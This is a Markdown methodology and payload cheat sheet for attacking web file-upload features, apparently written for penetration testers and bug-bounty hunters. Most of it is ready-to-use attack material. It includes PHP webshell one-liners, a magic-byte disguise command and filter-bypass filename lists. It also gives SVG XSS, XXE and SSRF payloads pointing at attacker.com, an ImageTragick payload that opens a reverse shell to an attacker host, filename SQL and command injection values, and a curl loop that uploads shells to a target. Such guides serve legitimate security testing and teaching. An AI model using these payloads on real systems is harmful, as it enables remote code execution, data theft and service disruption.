# 📤 File Upload Vulnerability Methodology

> **A complete, structured approach to breaking file upload functionality — from filter bypass to RCE and beyond.**

---

<div align="center">

![Type](https://img.shields.io/badge/Vulnerability-File%20Upload-red?style=for-the-badge)
![Scope](https://img.shields.io/badge/Scope-Extension%20%7C%20MIME%20%7C%20Content%20%7C%20Logic-orange?style=for-the-badge)
![Approach](https://img.shields.io/badge/Approach-Manual%20%2B%20Burp%20%2B%20Hex%20Editor-blue?style=for-the-badge)

</div>

---

## 📋 Table of Contents

1. [Introduction](#-introduction)
2. [Extension → Impact Reference](#-extension--impact-reference)
3. [Phase 1 — Recon: Identify the Validation Layer](#-phase-1--recon-identify-the-validation-layer)
4. [Phase 2 — Blacklist Bypass](#-phase-2--blacklist-bypass)
5. [Phase 3 — Whitelist Bypass](#-phase-3--whitelist-bypass)
6. [Phase 4 — Content-Type / MIME Bypass](#-phase-4--content-type--mime-bypass)
7. [Phase 5 — Content & Magic-Byte Bypass](#-phase-5--content--magic-byte-bypass)
8. [Phase 6 — Client-Side & Content-Length Bypass](#-phase-6--client-side--content-length-bypass)
9. [Phase 7 — Special Character & Filesystem Tricks](#-phase-7--special-character--filesystem-tricks)
10. [Phase 8 — Extension-Specific Exploitation](#-phase-8--extension-specific-exploitation)
11. [Phase 9 — Filename-Based Injection](#-phase-9--filename-based-injection)
12. [Phase 10 — Upload-from-URL (SSRF)](#-phase-10--upload-from-url-ssrf)
13. [Phase 11 — DoS via Upload](#-phase-11--dos-via-upload)
14. [Phase 12 — My Full Checklist Scenario](#-phase-12--my-full-checklist-scenario)
15. [Phase 13 — Automated Fuzzing](#-phase-13--automated-fuzzing)
16. [Summary Workflow](#️-summary-workflow)
17. [Quick Decision Tree](#-quick-decision-tree)

---

## 📖 Introduction

File upload functionality is high-impact attack surface: a weak validation layer can escalate from a simple filter bypass all the way to remote code execution, stored XSS, SSRF, XXE, or denial of service — depending entirely on what the server does with the uploaded file afterward (execute it, parse it, serve it, resize it, or just store it).

---

## 🎯 Extension → Impact Reference

| Extension | Potential Impact |
|---|---|
| `ASP`, `ASPX`, `PHP`, `PHP3/4/5`, `JSP` | Webshell → RCE |
| `SVG` | Stored XSS, SSRF, XXE |
| `GIF` | Stored XSS, SSRF |
| `CSV` | CSV/formula injection |
| `XML` | XXE |
| `AVI` | LFI, SSRF |
| `HTML`, `JS` | HTML injection, XSS, open redirect |
| `PNG`, `JPEG` | Pixel-flood DoS |
| `ZIP` | RCE via LFI (zip wrapper), DoS (zip bomb) |
| `PDF`, `PPTX` | SSRF, blind XXE |

---

## 🧪 Phase 1 — Recon: Identify the Validation Layer

Before throwing every bypass at once, work out WHICH layer is actually checking the file, so you can target it precisely.

```
1. Upload the shell with its real extension (e.g. shell.php) → note
   the rejection message
2. Rename to an allowed extension (shell.jpg) but keep PHP content and
   Content-Type: application/x-php → if it still fails, extension
   alone isn't the only check
3. Keep the .jpg name, but change Content-Type to image/jpeg → if it
   still fails, content-type alone isn't the only check either
4. At this point, if it's STILL failing, the app is likely checking
   file content / magic bytes — move to Phase 5
5. If any of the above steps succeeds and the file gets stored, check
   whether it's stored under the original name, a randomized name, or
   with the extension stripped/changed — this determines whether you
   even NEED an extension bypass to get code execution
```

---

## 🚫 Phase 2 — Blacklist Bypass

When the app blocks known dangerous extensions, try lesser-known executable variants for the same language:

```
PHP:          .phtm  .phtml  .phps  .pht  .php2  .php3  .php4  .php5
              .shtml  .phar  .pgif  .inc
ASP:          .asp  .aspx  .cer  .asa
JSP:          .jsp  .jspx  .jsw  .jsv  .jspf
ColdFusion:   .cfm  .cfml  .cfc  .dbm
```

### Random Case Bypass

```
file.pHp
file.PhP5
file.PhAr
```

---

## ✅ Phase 3 — Whitelist Bypass

When only specific extensions are allowed, trick the parser into treating a dangerous extension as the "real" one:

```
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\x00.jpg
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\
file.php#.png
file.
.html
```

### Null Byte Variants (targets `pathinfo()`-style parsing)

```
file.php%00.gif
file.php\x00.gif
file.php%00.png
file.php\x00.png
file.php%00.jpg
file.php\x00.jpg
```

> When uploading directly (not via a raw request), the null byte can also be set by naming the file `file.phpD.jpg` and using a hex editor to change the `D` (0x44) to `\x00`.

### Double Extension

```
file.jpg.php     ← primary bypass
file.php.jpg     ← "reverse double extension", useful against Apache
                    misconfigs that execute anything containing .php,
                    not just files ENDING in .php
```

---

## 🎭 Phase 4 — Content-Type / MIME Bypass

```
POST /images/upload/ HTTP/1.1
Host: target.com

-----------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php
```

Change the `Content-Type` to a permitted image type while keeping the payload:

```
POST /images/upload/ HTTP/1.1
Host: target.com

-----------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg
```

Try each of these values:

```
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/jpeg
```

> 📚 Full MIME wordlist for fuzzing: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)

Also try **setting Content-Type twice** — once with a disallowed value and once with an allowed one — some parsers only validate the first/last occurrence:

```
Content-Type: application/x-php
Content-Type: image/jpeg
```

---

## 🔬 Phase 5 — Content & Magic-Byte Bypass

### GIF89a Header Prefix

Prepend a fake GIF signature string before the payload — passes checks that only look for the string "GIF89a" at the start of the content:

```
POST /images/upload/ HTTP/1.1
Host: target.com

-----------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/gif

GIF89a; <?php system($_GET['cmd']); ?>
```

### Real Magic-Byte Injection (defeats binary signature checks)

Magic numbers are the first few bytes that uniquely identify a file format — checkable with a hex editor or `xxd`:

```bash
xxd image.jpeg | head
```

Common signatures:

```
JPEG: \xFF\xD8\xFF
PNG:  \x89\x50\x4e\x47\x0d\x0a\x1a\x0a
GIF:  GIF87a  or  GIF8;
BMP:  BM
PSD:  8BPS
SWF:  FWS
```

Prepend the real signature bytes to a PHP payload:

```bash
echo -e $'\xFF\xD8\xFF\xE0\n<?php system($_GET["cmd"]); ?>' > shell.jpg.pHp

# Confirm the OS now identifies it as a real image
file shell.jpg.pHp
# shell.jpg.pHp: JPEG image data
```

> 💡 **How to tell WHICH check is active:** try changing just the extension → still fails? Try just the Content-Type → still fails? If both fail independently, the app is validating actual file signature bytes, not just metadata — move straight to this technique.

### EXIF Comment Injection (defeats `getimagesize()`-based checks)

Some upload handlers validate "is this a real image" purely via `getimagesize()`, which only reads image headers/dimensions — a payload hidden in EXIF metadata still passes:

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); ?>' file.jpg
mv file.jpg file.php.jpg
```

---

## 🖥️ Phase 6 — Client-Side & Content-Length Bypass

### Client-Side Validation

```
If the file type/size check happens in JavaScript before the request
is sent, intercept the request in Burp AFTER the client-side check
passes, then swap in the real payload and forward it — the server
never re-validates.
```

### Content-Length / Size-Limit Bypass

Use a minimal one-liner payload to slip under strict size limits:

```php
(<?=`$_GET[x]`?>)
```

---

## 🔡 Phase 7 — Special Character & Filesystem Tricks

```
# Multiple trailing dots — Windows strips trailing dots on file
# creation, potentially reverting to the dangerous extension
file.php......

# Whitespace / newline characters
file.php%20
file.php%0d%0a.jpg
file.php%0a

# Right-to-Left Override (RTLO) — visually reverses the extension
# name.%E2%80%AEphp.jpg  displays as  name.gpj.php

# Slash tricks
file.php/
file.php.\
file.j\sp
file.j/sp

# Chained special characters
file.jsp/././././.
```

### NTFS Alternate Data Streams (Windows only)

A colon after a forbidden extension and before an allowed one creates an empty file with the forbidden extension:

```
file.asax:.jpg
```

The `::$data` pattern can create a non-empty file with the dangerous extension — a trailing dot may be needed to bypass further filtering:

```
file.asp::$data.
```

---

## 💣 Phase 8 — Extension-Specific Exploitation

### SVG → XSS

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  <script type="text/javascript">alert("XSS");</script>
</svg>
```

### GIF → XSS

```
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
```

### Filename-Based XSS

```
filename="<svg onload=alert(document.domain)>"
filename="58832_300x300.jpg<svg onload=confirm()>"
```

### SVG → XXE

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

> 📚 Reference: [PortSwigger — XXE via file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

### SVG → SSRF

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" />
</svg>
```

### SVG → Open Redirect

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://attacker.com'" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
```

### ImageMagick — ImageTragick (RCE via crafted image)

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

### ZIP → RCE via LFI (Zip Slip / PHP zip wrapper)

```
1. Write a PHP payload, zip it (optionally disguise the .zip as an
   allowed extension like .jpg), and upload it
2. If a separate LFI/file-inclusion point exists, include the
   payload inside the archive via the zip:// wrapper:
     site.com/path?page=zip://path/file.zip%23rce.php
```

> See `LFI-Methodology.md` Phase 5 for the full `zip://` wrapper mechanics.

---

## 🧬 Phase 9 — Filename-Based Injection

The filename itself is often trusted more than the file content — test it as an independent injection point.

### Path Traversal

```
filename=../../etc/passwd/logo.png
filename=../../../logo.png
```

### SQL Injection

```
filename='sleep(10).jpg
filename=sleep(10)-- -.jpg
```

### Command Injection

```
filename=; sleep 10;
```

---

## 🌍 Phase 10 — Upload-from-URL (SSRF)

If the app supports "upload from URL" instead of only direct file upload:

```
1. Supply an internal target instead of a real image URL:
     http://127.0.0.1/, http://169.254.169.254/ (cloud metadata),
     http://internal-service:port/
2. If the resulting "image" is saved and served back, you may have
   blind SSRF — confirm out-of-band with a service like IPLogger or
   your own listener to also capture visitor metadata if the
   downloaded file is later publicly displayed
```

---

## 💥 Phase 11 — DoS via Upload

```
- Pixel-flood attack: upload a tiny image with an enormous declared
  pixel dimension/frame count in its header — decompression/resizing
  can exhaust server memory
- Large-value filename DoS: upload with an extremely long filename
  (e.g. thousands of repeated digits before the extension) to stress
  filesystem/path-handling limits: 1234...99.png
- Zip bomb: a small, heavily compressed .zip that expands to an
  enormous size when the server extracts it
```

---

## ✅ Phase 12 — My Full Checklist Scenario

A condensed run-through order that covers most real-world uploaders quickly:

```
1. Upload the .php shell directly, unmodified — see the rejection
2. Try double extensions: pic.jpg.php AND pic.php.jpg
3. Change Content-Type: application/x-php → image/jpeg (or png/gif)
4. Try case variation: pic.PhP, pic.php5, pic.pHP5
5. Try special characters: pic.php%00, pic.php%0a
6. Try embedding PHP code inside a comment/EXIF field of a real .jpg
7. Take a working PHP payload and, using a hex editor, prepend the
   real magic-byte signature of an allowed format (e.g. FF D8 FF E0
   for JPEG) directly before the PHP code
8. Mix and chain multiple techniques together — most real bypasses
   combine 2-3 of the above rather than relying on just one
```

### Example Vulnerable Validation Logic (why signature-only checks fail)

```php
<?php
$allowed_image_types = false;
$image_content = file_get_contents('image.png');
$allowed_image_types = array(
    'jpeg' => "\xFF\xD8\xFF",
    'gif'  => "GIF",
    'png'  => "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a",
    'bmp'  => "BM",
    'psd'  => "8BPS",
    'swf'  => "FWS",
);
foreach ($allowed_image_types as $type => $binary_check) {
    if (substr($image_content, 0, strlen($binary_check)) === $binary_check) {
        echo 'This ' . $type . ' image is allowed!';
    } else {
        echo 'Nope!';
    }
}
```

> This kind of check ONLY reads the first few bytes — everything after the signature can be arbitrary PHP code, which is exactly what Phase 5's magic-byte technique abuses.

---

## 🤖 Phase 13 — Automated Fuzzing

🛠️ Tools: Burp Intruder, [ffuf](https://github.com/ffuf/ffuf), [Upload Scanner](https://github.com/portswigger/upload-scanner) (Burp extension)

```bash
# Burp Intruder: set the filename extension AND Content-Type as
# payload positions, use a combined wordlist of blacklist-bypass
# extensions from Phase 2 + double-extension patterns from Phase 3

# Quick scripted sweep across extensions with curl
for ext in php phtml phar php5 pht phps asp aspx jsp; do
  curl -s -F "uploaded=@shell.${ext};type=image/jpeg" \
    https://target.com/images/upload/ -o /dev/null -w "$ext -> %{http_code}\n"
done
```

Burp's **Upload Scanner** extension automates most of Phases 2-5 (blacklist/whitelist/MIME/magic-byte permutations) against a single captured upload request — good for wide coverage before manual follow-up on anything promising.

---

## ⚔️ Summary Workflow

```
┌──────────────────────────────────────────────────────┐
│               FILE UPLOAD WORKFLOW                     │
├──────────────────────────────────────────────────────┤
│                                                        │
│  1. 🧪 Recon: Which layer validates? (ext/MIME/content)│
│            ↓                                          │
│  2. 🚫 Blacklist Bypass (alt extensions, case)         │
│            ↓                                          │
│  3. ✅ Whitelist Bypass (double ext, null byte)        │
│            ↓                                          │
│  4. 🎭 Content-Type / MIME Bypass                      │
│            ↓                                          │
│  5. 🔬 Magic-Byte / Content Signature Bypass           │
│            ↓                                          │
│  6. 🖥️ Client-Side & Content-Length Bypass             │
│            ↓                                          │
│  7. 🔡 Special Character / Filesystem Tricks           │
│            ↓                                          │
│  8. 💣 If Execution Blocked → Extension-Specific        │
│         Exploitation (SVG/XXE/ImageTragick/Zip Slip)   │
│            ↓                                          │
│  9. 🧬 Test Filename as Its Own Injection Point         │
│            ↓                                          │
│ 10. 🌍 Test Upload-from-URL for SSRF                    │
│            ↓                                          │
│ 11. 💥 Check DoS Vectors (pixel flood, zip bomb)        │
│            ↓                                          │
│ 12. 🤖 Automate Sweep with Burp Upload Scanner/ffuf     │
│            ↓                                          │
│ 13. 📝 Document & Report                               │
│                                                        │
└──────────────────────────────────────────────────────┘
```

---

## 🧠 Quick Decision Tree

```
Uploading the raw payload extension gets rejected?
    ├── Extension only → try Phase 2 (blacklist bypass) / Phase 3
    │                     (whitelist double-extension / null byte)
    │
    ├── Extension AND Content-Type change still fail → likely content/
    │   magic-byte validation → Phase 5 (real signature bytes / EXIF)
    │
    └── Everything fails even with correct signature → check if it's
        purely a display/storage feature (no execution possible) →
        pivot to Phase 8 (SVG XXE/XSS/SSRF) instead of chasing RCE

File gets accepted and stored?
    ├── Stored with original filename, in a web-reachable path?
    │   → try to access it directly for RCE/XSS
    │
    ├── Filename/path reflected without sanitization?
    │   → test path traversal, SQLi, command injection (Phase 9)
    │
    ├── "Upload from URL" feature present?
    │   → test SSRF (Phase 10)
    │
    └── App parses/resizes/converts the file server-side?
        → test ImageTragick, XXE via SVG/XML, zip-based inclusion
          (Phase 8), and DoS vectors (Phase 11)
```

---

### 📚 Resources

- 🔗 [HolyBugx — File Upload Checklist](https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md)
- 🔗 [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- 🔗 [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/)
- 🔗 [SecLists — Content-Type wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
- 🔗 [List of File Signatures — Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
- 🔗 [Galaxy Bug Bounty Checklist — DoS via Upload](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/tree/main/DOS)
- Companion docs: `LFI-Methodology.md`, `API-Testing-Methodology.md`

---

<div align="center">

### 🔥 Find the check. Bypass the filter. Chase the execution.

---

*Happy Hacking — responsibly and ethically* 🛡️

</div>
